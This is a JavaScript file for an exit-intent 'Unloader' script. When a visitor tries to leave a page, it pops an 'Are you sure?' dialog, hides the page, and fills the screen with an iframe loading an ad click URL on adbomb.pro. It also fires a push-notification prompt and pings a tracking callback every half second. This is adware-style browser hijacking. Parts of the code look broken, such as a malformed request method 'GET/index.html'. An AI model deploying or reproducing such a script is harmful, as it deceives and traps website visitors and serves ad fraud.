let Unloader = {
    redirectUrl: '',
    message: '',
    $unloadLayer: $('<div>'),
    $exitPageFrame: $('<iframe>'),
    afterUnload: false,
    needs_call_cb: false,
    call_cb: function () {
        if (this.needs_call_cb) {
            let req = new XMLHttpRequest();
            req.open('GET/index.html', '/cb_ok/?esub=' + acrum_extra['esub']);
            req.send(null);
            this.needs_call_cb = false;
        }
    },
    init: function () {
        $('.ac_footer a').on('click', function (event) {
            event.preventDefault();
            $(window).off('beforeunload');
            window.open('http://ac-feedback.com/report_form/', 'blank_');
        });
        let oThis = this;
        this.$unloadLayer.css('overflow-y', 'scroll').css('height', '100%').css('width', '100%').css('display', 'none');
        this.$unloadLayer.attr('id', 'unload-layer');
        this.$exitPageFrame.css('border', '0px').css('height', '100%').css('width', '100%');
        this.$exitPageFrame.hide();
        this.$exitPageFrame.attr('src', this.redirectUrl);
        this.$exitPageFrame.appendTo(this.$unloadLayer);

        $(window).on('beforeunload', function (e) {
            this.needs_call_cb = true;
            if (!oThis.afterUnload) {
                oThis.afterUnload = true;
            } else {
                $(window).off('beforeunload');
                return false;
            }

            setTimeout(function () {
                window.show_pushwru_show && window.show_pushwru_show();
            }, 250);

            return Unloader.preserve();
        });
    },
    preserve: function () {
        this.$unloadLayer.appendTo('body');
        $('body').css({background: 'none'});
        $('body > *').not('#unload-layer').css('display', 'none');
        this.$unloadLayer.height($(window).height() + 'px').css('display', 'block');
        this.$exitPageFrame.show();
        $(window).off('beforeunload');
        return this.message;
    }
};
setInterval(Unloader.call_cb, 500);

$(function () {
    Unloader.message = "Are you sure?";
    Unloader.redirectUrl = "http://adbomb.pro/click.php?lp=1";
    Unloader.init();
});